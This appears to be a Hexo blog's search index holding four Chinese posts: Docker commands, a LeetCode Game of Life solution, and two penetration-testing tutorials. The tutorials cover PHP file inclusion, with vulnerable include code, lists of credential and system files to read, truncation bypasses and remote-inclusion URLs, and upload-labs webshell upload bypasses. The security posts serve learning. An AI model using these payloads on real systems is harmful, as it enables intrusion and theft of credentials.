<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>docker指令</title>
    <url>/2020/04/20/docker%E6%8C%87%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><p>本文用于记录常用的docker指令，关于docker的介绍和学习可以看这篇<a href="https://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html" target="_blank" rel="noopener">博客</a></p>
<a id="more"></a>

<h2 id="服务相关命令"><a href="#服务相关命令" class="headerlink" title="服务相关命令"></a>服务相关命令</h2><ul>
<li><p>启动docker服务</p>
<p><code>systemctl start docker</code></p>
</li>
<li><p>停止docker服务</p>
<p><code>systemctl stop docker</code></p>
</li>
<li><p>重启docker服务</p>
<p><code>systemctl restart docker</code></p>
</li>
<li><p>查看docker服务状态</p>
<p><code>systemctl status docker</code></p>
</li>
<li><p>设置开机启动docker服务</p>
<p><code>systemctl enable docker</code></p>
</li>
</ul>
<h2 id="镜像相关命令"><a href="#镜像相关命令" class="headerlink" title="镜像相关命令"></a>镜像相关命令</h2><ul>
<li><p>查看镜像：查看本地所有的镜像</p>
<p><code>docker images</code></p>
</li>
<li><p>搜索镜像：从网络中查找需要的镜像</p>
<p><code>docker search &lt;name&gt;</code></p>
</li>
<li><p>拉取镜像：从docker仓库中下载镜像(版本号可以看<a href="https://hub.docker.com/" target="_blank" rel="noopener">官网</a>)</p>
<p><code>docker pull &lt;name&gt;</code></p>
</li>
<li><p>删除镜像：删除本地镜像</p>
<p><code>docker rmi &lt;id&gt;</code></p>
<p><code>docker rmi &#39;docker images -q&#39;</code> #删除所有镜像</p>
</li>
</ul>
<h2 id="容器相关命令"><a href="#容器相关命令" class="headerlink" title="容器相关命令"></a>容器相关命令</h2><ul>
<li><p>查看容器</p>
<p><code>docker ps</code> #查看正在运行的容器</p>
<p><code>docker ps -a</code> #查看所有容器</p>
</li>
<li><p>创建并启动容器</p>
<p><code>docker run 参数</code></p>
<blockquote>
<p>参数说明</p>
<p>-i ：保持容器运行。</p>
<p>-t ：为容器重新分配一个伪输入终端</p>
<p>-d ：以后台模式运行容器。需要<code>docker exec</code>进入容器内部</p>
<p>-it创建的容器为交互式容器    -id创建的容器为守护式容器</p>
<p>–name ：为创建的容器命名</p>
</blockquote>
</li>
<li><p>进入容器</p>
<p><code>docker exec 参数</code></p>
</li>
<li><p>停止容器</p>
<p><code>docker stop 参数</code></p>
</li>
<li><p>启动容器</p>
<p><code>docker start 参数</code></p>
</li>
<li><p>删除容器（在容器停止状态下才能删除）</p>
<p><code>docker rm 参数</code></p>
</li>
<li><p>查看容器信息</p>
<p><code>docker inspect 参数</code></p>
</li>
</ul>
<h2 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h2><ul>
<li><p>创建启动容器时，使用<code>-v</code>参数设置数据卷</p>
<p><code>docker run ... -v 宿主机目录(文件):容器内目录(文件)</code></p>
<blockquote>
<p>目录为绝对路径</p>
<p>如果目录不存在，会自动创建</p>
<p>可以挂载多个数据卷</p>
</blockquote>
</li>
</ul>
<h2 id="镜像制作"><a href="#镜像制作" class="headerlink" title="镜像制作"></a>镜像制作</h2><ul>
<li><p>容器转为镜像</p>
<p><code>docker commit &lt;容器id&gt; &lt;镜像name:version&gt;</code></p>
</li>
<li><p>镜像转为压缩文件用于传输</p>
<p><code>docker save -o &lt;压缩文件name&gt; &lt;镜像name:version&gt;</code></p>
</li>
<li><p>压缩文件还原镜像</p>
<p><code>docker load -i &lt;压缩文件name&gt;</code></p>
</li>
</ul>
<h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><p><code>Dockerfile</code>的编写，可以理解为编写一堆命令，这堆命令做的事，就是基于一个基础镜像（这个镜像通常是选择官方的镜像），跑一个临时的容器，然后将代码添加到临时容器中并安装运行代码所需要的环境，最后将这个临时的容器打包成新的镜像，删除这个临时的镜像。这种效率比较慢，还不如本地跑一个容器，将所有环境配置好，然后打包成镜像使用。</p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode题解289</title>
    <url>/2020/04/19/LeetCode%E9%A2%98%E8%A7%A3289/</url>
    <content><![CDATA[<h1 id="LeetCode题解"><a href="#LeetCode题解" class="headerlink" title="LeetCode题解"></a>LeetCode题解</h1><p><strong>第289题 生命游戏</strong></p>
<p>根据<a href="https://baike.baidu.com/item/%E7%94%9F%E5%91%BD%E6%B8%B8%E6%88%8F/2926434?fr=aladdin" target="_blank" rel="noopener">百度百科</a>，生命游戏，简称为生命，是英国数学家约翰·何顿·康威(老爷子前段时间因为新冠肺炎去世，唉，缅怀)在 1970 年发明的细胞自动机。</p>
<p>给定一个包含 m × n 个格子的面板，每一个格子都可以看成是一个细胞。每个细胞都具有一个初始状态：1 即为活细胞（live），或 0 即为死细胞（dead）。每个细胞与其八个相邻位置（水平，垂直，对角线）的细胞都遵循以下四条生存定律：</p>
<blockquote>
<ol>
<li>如果活细胞周围八个位置的活细胞数少于两个，则该位置活细胞死亡；</li>
<li>如果活细胞周围八个位置有两个或三个活细胞，则该位置活细胞仍然存活；</li>
<li>如果活细胞周围八个位置有超过三个活细胞，则该位置活细胞死亡；</li>
<li>如果死细胞周围正好有三个活细胞，则该位置死细胞复活；</li>
</ol>
</blockquote>
<p>根据当前状态，写一个函数来计算面板上所有细胞的下一个（一次更新后的）状态。下一个状态是通过将上述规则同时应用于当前状态下的每个细胞所形成的，其中细胞的出生和死亡是同时发生的。</p>
<p>示例：</p>
<blockquote>
<p>输入：<br>[<br>  [0,1,0],<br>  [0,0,1],<br>  [1,1,1],<br>  [0,0,0]<br>]<br>输出：<br>[<br>  [0,0,0],<br>  [1,0,1],<br>  [0,1,1],<br>  [0,1,0]<br>]</p>
</blockquote>
<a id="more"></a>

<p>原题如上，代码如下：</p>
<p><strong>python版本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(self,i,j,board)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> i == len(board) <span class="keyword">or</span> i == <span class="number">-1</span> <span class="keyword">or</span> j == len(board[<span class="number">0</span>]) <span class="keyword">or</span> j == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> board[i][j]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">environment</span><span class="params">(self,i,j,board)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.check(i<span class="number">-1</span>,j<span class="number">-1</span>,board)+self.check(i<span class="number">-1</span>,j,board)+self.check(i<span class="number">-1</span>,j+<span class="number">1</span>,board)+self.check(i,j<span class="number">-1</span>,board)+self.check(i,j+<span class="number">1</span>,board)+self.check(i+<span class="number">1</span>,j<span class="number">-1</span>,board)+self.check(i+<span class="number">1</span>,j,board)+self.check(i+<span class="number">1</span>,j+<span class="number">1</span>,board)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">now</span><span class="params">(self,i,j,k,board)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> board[i][j] == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> k == <span class="number">2</span> <span class="keyword">or</span> k== <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> board[i][j] == <span class="number">0</span> <span class="keyword">and</span> k == <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>       </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gameOfLife</span><span class="params">(self, board)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type board: List[List[int]]</span></span><br><span class="line"><span class="string">        :rtype: None Do not return anything, modify board in-place instead.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        new = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(board)):</span><br><span class="line">            subnew = []</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(board[<span class="number">0</span>])):</span><br><span class="line">                subnew.append(self.now(i,j,self.environment(i,j,board),board))</span><br><span class="line">            new.append(subnew)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(new)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(new[<span class="number">0</span>])):</span><br><span class="line">                board[i][j] = new[i][j]</span><br></pre></td></tr></table></figure>

<p><img src="https://s1.ax1x.com/2020/04/19/JMSl1f.png" alt="JMSl1f.png"></p>
<p><strong>解析：</strong></p>
<p>这道题的大致思路就是遍历二维数据的每一个元素，查询一下周围的元素状态，看他们符合条件的哪一种，来决定当前元素的变化，值得注意的是：</p>
<ol>
<li>对于边界元素的处理。</li>
<li>对于改变元素的值是全部元素同时发生，不要出现异步处理的情况。</li>
</ol>
<p>对于第一个问题，我使用了<code>check</code>函数来检查当前元素是否符合规范，对于不合规范的值我视为0，这是因为在对周围元素处理处理的过程中，元素死为0，活为1，来统计周围元素环境的时候，我可以对周围元素的值进行加和，利用加和值判定条件，这里也是<code>environment</code>函数的工作原理，也就因为当不合规范的值置为0时，才对加和值无影响。</p>
<p><code>check</code> 函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(self,i,j,board)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> i == len(board) <span class="keyword">or</span> i == <span class="number">-1</span> <span class="keyword">or</span> j == len(board[<span class="number">0</span>]) <span class="keyword">or</span> j == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> board[i][j]</span><br></pre></td></tr></table></figure>

<p><code>environment</code>函数：(这里写的粗糙了，可以用位移数组来进行优化)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">environment</span><span class="params">(self,i,j,board)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> self.check(i<span class="number">-1</span>,j<span class="number">-1</span>,board)+self.check(i<span class="number">-1</span>,j,board)+self.check(i<span class="number">-1</span>,j+<span class="number">1</span>,board)+self.check(i,j<span class="number">-1</span>,board)+self.check(i,j+<span class="number">1</span>,board)+self.check(i+<span class="number">1</span>,j<span class="number">-1</span>,board)+self.check(i+<span class="number">1</span>,j,board)+self.check(i+<span class="number">1</span>,j+<span class="number">1</span>,board)</span><br></pre></td></tr></table></figure>

<p>最后，关于当前元素的变化规则，我也用了<code>now</code>函数来返回：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">now</span><span class="params">(self,i,j,k,board)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> board[i][j] == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">2</span> <span class="keyword">or</span> k== <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> board[i][j] == <span class="number">0</span> <span class="keyword">and</span> k == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>在这个算法中的时间复杂度O(mn)，空间复杂度也是O(mn)。</p>
<p>其实可以使空间复杂度为O(1)，那就是使用原数组的内存空间(一个int类型为32位大小，仅仅存储0和1两种状态还有大部分空间没有被用到)，但是要保证其元素的变化是同步进行的，也就是说不会产生异步影响，即当前元素变化导致其他元素对该变化在这次变化中进行变化(有点绕，其实也好理解，就是说，大家状态值要变就一起变，不要我变了，你才变)。</p>
<p>那么这时候可以引进新的状态值，即2和3，自定义2为<code>0 --&gt;1</code>和3为<code>1--&gt;0</code>，对于上一次变化来说碰到2就当作0来处理，碰到3就当作1来处理，最后对于下一次变化，碰到2设置为1，碰到3设置为0。</p>
<p>这个方法极大的减少了当二位数组太大的情况下的内存空间的浪费(PS:我懒得写这个方法的代码了，思路就是上面的思路)</p>
]]></content>
      <categories>
        <category>LeetCode题解</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含漏洞</title>
    <url>/2020/04/06/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>（冲冲冲，继续学习。）</p>
<p>什么是文件包含漏洞？</p>
<p>服务器通过PHP的特性去包含任意文件时，对文件来源过滤不严，从而可以包含一个恶意文件。</p>
<p>简要来说，服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间，但是如果这个包含的文件是变量或者用户可以篡改的，且开发人员过滤不严，那么就有可能包含一个恶意文件，导致服务器遭到侵害。</p>
<p>（注意：文件包含不止在PHP中，只是PHP比较严重而已，其他脚本语言例如JSP，ASP也有文件包含漏洞）</p>
<a id="more"></a>

<h1 id="PHP中关于文件包含的函数"><a href="#PHP中关于文件包含的函数" class="headerlink" title="PHP中关于文件包含的函数"></a>PHP中关于文件包含的函数</h1><p>PHP中文件包含函数有以下四种：</p>
<blockquote>
<p>require()</p>
<p>require_once()</p>
<p>include()</p>
<p>include_once()</p>
</blockquote>
<p><code>include</code>和<code>require</code>区别主要是，<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p>
<p>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>
<p>当使用这4个函数包含一个新文件时，该文件将作为PHP代码执行，PHP内核并不会在意被包含的文件类型，只要文件中含有PHP代码既可以服务器所解析。</p>
<h1 id="PHP文件包含利用"><a href="#PHP文件包含利用" class="headerlink" title="PHP文件包含利用"></a>PHP文件包含利用</h1><p>当出现以下两种情况的时候，就可以利用到文件包含漏洞：</p>
<ol>
<li>include等函数通过变量控制需要包含的文件</li>
<li>用户能够控制这些变量</li>
</ol>
<h2 id="本地文件包含LFI"><a href="#本地文件包含LFI" class="headerlink" title="本地文件包含LFI"></a>本地文件包含LFI</h2><p>举一个简单例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[file]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个<code>test</code>中可以看到由用户可以控制的<code>$_GET</code>传入的参数<code>file</code>可以指定<code>include</code>函数所包含的文件</p>
<p>我们在该目录建立一个txt文件，其中包含PHP代码</p>
<p><img src="https://s1.ax1x.com/2020/04/14/JpCGyF.png" alt="JpCGyF.png"></p>
<p>URL为:<code>http://localhost/file_include/test.php?file=1.txt</code></p>
<p><img src="https://s1.ax1x.com/2020/04/14/JpVpX6.png" alt="JpVpX6.png"></p>
<p>如果是不加限制的文件包含漏洞，那么我们可以使用目录遍历漏洞轻易的知道很多敏感信息，比如：</p>
<p>Windows系统</p>
<blockquote>
<p>c:\boot.ini // 查看系统版本</p>
<p>c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件</p>
<p>c:\windows\repair\sam // 存储Windows系统初次安装的密码</p>
<p>c:\ProgramFiles\mysql\my.ini // MySQL配置</p>
<p>c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</p>
<p>c:\windows\php.ini // php 配置信息</p>
</blockquote>
<p>Linux/Unix系统</p>
<blockquote>
<p>/etc/passwd // 账户信息</p>
<p>/etc/shadow // 账户密码文件</p>
<p>/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</p>
<p>/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置</p>
<p>/usr/local/app/php5/lib/php.ini // PHP相关配置</p>
<p>/etc/httpd/conf/httpd.conf // Apache配置文件</p>
<p>/etc/my.conf // mysql 配置文件    </p>
</blockquote>
<p>​    一般可以将本地文件包含配合文件上传漏洞使用，文件上传漏洞可以看我之前的博客，假若攻击者上传webshell到服务器上，只需知道其路径和名称，就可以配合文件包含漏洞使用，但是这里面有个问题。</p>
<p>如果关于文件包含的代码如下所示：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename  = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">include</span>($filename . <span class="string">".html"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>只会在请求中获取文件名，在代码中加入后缀名。</p>
<p>这个时候我们可以用到%00截断，因为php的内核是用c实现的，因此使用了一些字符串处理函数，在连接字符串的时候，0字节(\x00)可以看作字符串结束符。那么我们就可以使用%00截断来实现绕过。但是有个前提条件：<code>magic_quotes_gpc = Off</code>且php版本&lt;5.3.4，因为当<code>magic_quotes_gpc = On</code>时候，会将%00看作NULL处理。</p>
<p>还有一种就是路径长度截断：</p>
<p>条件：windows OS，点号需要长于256；linux OS 长于4096</p>
<blockquote>
<p>Windows下目录最大长度为256字节，超出的部分会被丢弃；</p>
<p>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</p>
</blockquote>
<p>可以用到这样的文件名：</p>
<p><code>test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</code></p>
<p>在windows环境下还可以使用点号截断：</p>
<p>条件：windows OS，点号需要长于256</p>
<p>举例：</p>
<p><code>filename=test.txt.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</code></p>
<h2 id="远程文件包含RFI"><a href="#远程文件包含RFI" class="headerlink" title="远程文件包含RFI"></a>远程文件包含RFI</h2><p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p>
<blockquote>
<p>allow_url_fopen = On（是否允许打开远程文件，默认开启）</p>
<p>allow_url_include = On（是否允许include/require远程文件，默认关闭）</p>
</blockquote>
<p>举例：</p>
<p>引用上面的测试代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[file]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>http://localhost/file_include/test.php?file=http://192.168.0.102/1.txt</code></p>
<p><img src="https://s1.ax1x.com/2020/04/19/JKwvZV.png" alt="JKwvZV.png"></p>
<p>如果远程文件包含也使用了如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename  = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">include</span>($filename . <span class="string">".html"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>那么可以使用<code>?</code>和<code>#</code>进行绕过：</p>
<p><code>http://localhost/file_include/test.php?file=http://192.168.0.102/1.txt?</code></p>
<p><code>http://localhost/file_include/test.php?file=http://192.168.0.102/1.txt#</code></p>
<h1 id="本地文件包含的利用技巧"><a href="#本地文件包含的利用技巧" class="headerlink" title="本地文件包含的利用技巧"></a>本地文件包含的利用技巧</h1><p>在本地文件包含中如何执行php代码，这也是具有方法的。</p>
<p>远程文件包含之所以可以执行命令，就是因为攻击者可以自定义被包含的文件内容，因此本地文件包含漏洞想要执行命令，也需要找到一个可以被攻击者能控制内容的文件。</p>
<p>一般来说，有以下几种：</p>
<ol>
<li>包含用户上传的文件 (这个配合文件上传漏洞)</li>
<li>包含data://或者php://input等伪协议(这个利用下面那个文章里面有)</li>
<li>包含Session文件(这个我尝试过，可用空间不大，应用范围比较小)</li>
<li>包含日志文件</li>
<li>包含其他上传的临时文件，以及其他应用所创建的临时文件</li>
</ol>
<p>这些利用方式具体得看实战环境，之后我会慢慢介绍。</p>
<p>同时，推荐这篇文章，关于文件包含漏洞写的不错，<a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">文件包含漏洞</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>文件包含漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞</title>
    <url>/2020/04/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>什么是文件上传？</p>
<p>将客户端数据以文件形式封装，通过网络协议发送到服务端，保存在服务端中，在硬盘上作为真实文件形式进行保存。</p>
<p>文件上传功能本身没有问题，是正常的业务需求，但有问题的是文件上传后，服务器怎么处理，解释文件，这样就造就了文件上传漏洞(file up load vulnerability)</p>
<a id="more"></a>

<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>大多数情况下，文件上传漏洞一般都是指上传一个web脚本能够被服务器解析，也就是webshell的问题。要完成这个，要满足一下几个条件：</p>
<ol>
<li>上传的文件要能够被web容器所解析。那么上传文件所在的目录要是web容器所覆盖的路径。</li>
<li>用户能够从web上访问这个文件。</li>
<li>文件内容不能被安全检查，格式化，图片压缩等改变了内容，否则服务器解析不了文件。</li>
</ol>
<p>之前的博客中我有关于文件上传漏洞的内容——<a href="https://bmoos.github.io/2020/02/23/渗透测试实战-家用电脑/">“渗透测试实战–家用电脑”</a></p>
<p>（现在回头来看简直是小白中的小白，我都不知道自己是如何敢取这个名字的）</p>
<p>简单来说如果发现客户端对用户上传文件没有进行过滤审查或者审查不严，就有可能造成文件上传漏洞。</p>
<h1 id="安全检测"><a href="#安全检测" class="headerlink" title="安全检测"></a>安全检测</h1><p>一般的开发者都会对用户上传文件进行检测，而一般的检测方式为：</p>
<ol>
<li>客户端JavaScript检测</li>
<li>服务端MIME类型检测</li>
<li>黑名单扩展名过滤</li>
<li>白名单扩展名过滤</li>
<li>文件内容检测</li>
</ol>
<p>这里分别对其进行介绍和其绕过方式的介绍</p>
<h2 id="客户端JavaScript检测"><a href="#客户端JavaScript检测" class="headerlink" title="客户端JavaScript检测"></a>客户端JavaScript检测</h2><p>这种方式对一般用户来说可以限制住其上传的文件类型，但是对于攻击者或者稍微懂技术的人员来说，简直形同虚设。</p>
<p>我们用<a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">upload-labs</a>进行举例：</p>
<p>这个是pass-01中的代码片段：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种只在前端使用JavaScript进行验证可以通过多种方式进行绕过，这里我使用的是burpsuite</p>
<p>我们可以将写的webshell(关于webshell写法上面的博客链接中有说到，此处不谈)文件后缀改成合适的，比如jpg，png，gif等，然后burpsuite将http包截获并修改包内文件后缀名：</p>
<p><img src="https://s1.ax1x.com/2020/04/02/GtEQuq.png" alt="GtEQuq.png"></p>
<p>将此处文件后缀名修改成php就行</p>
<p><img src="https://s1.ax1x.com/2020/04/02/GtEoa8.png" alt="GtEoa8.png"></p>
<p>改成php后缀名就可以绕过前端检测，客户端验证只是用来防止用户输入错误，减少服务器开销，而真正的验证还得看服务端验证。</p>
<h2 id="服务端MIME类型检测"><a href="#服务端MIME类型检测" class="headerlink" title="服务端MIME类型检测"></a>服务端MIME类型检测</h2><p>在介绍这种验证方式之前，先得介绍一下MIME类型是个啥</p>
<blockquote>
<p>MIME (<strong>M</strong>ultipurpose <strong>I</strong>nternet <strong>M</strong>ail <strong>E</strong>xtensions) 是描述消息内容类型的因特网标准。</p>
<p>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p>
<p>媒体类型通常是使用 HTTP 协议，通过 Content-Type 来表示的，例如:</p>
<p>Content-Type: text/HTML</p>
<p>媒体类型对文件传输时文件类型进行了标注</p>
</blockquote>
<p>刚好upload-labs中pass-02就是一个MIME类型检测，代码片段如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现其中判断语句为</p>
<p><code>if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/gif&#39;))</code></p>
<p>发现只有三种MIME类型通过验证<code>image/jpeg</code> <code>image/png</code> <code>image/gif</code></p>
<p>其实也可以通过我们在pass-01中的方法进行绕过，因为在上传jpg时，客户端会在发送http请求时，将<code>Content-Type</code>字段置为<code>image/jpeg</code></p>
<p><img src="https://s1.ax1x.com/2020/04/03/Gtgf41.png" alt="Gtgf41.png"></p>
<p>当然也可以上传php文件，然后截获http包将其<code>Content-Type：application/php</code>改为<code>Content-Type：image/jpeg</code></p>
